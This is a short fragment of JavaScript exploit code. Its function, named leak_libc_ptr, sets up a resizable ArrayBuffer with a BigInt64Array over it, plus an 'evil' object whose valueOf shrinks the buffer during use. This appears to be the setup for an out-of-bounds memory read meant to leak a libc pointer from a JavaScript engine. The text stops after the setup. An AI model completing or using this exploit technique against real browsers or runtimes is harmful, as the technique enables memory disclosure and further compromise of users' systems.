function leak_libc_ptr() {
  const L1 = 0x3000;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);
  let evil = { valueOf() { rab.resize(L2); return 0n; } };
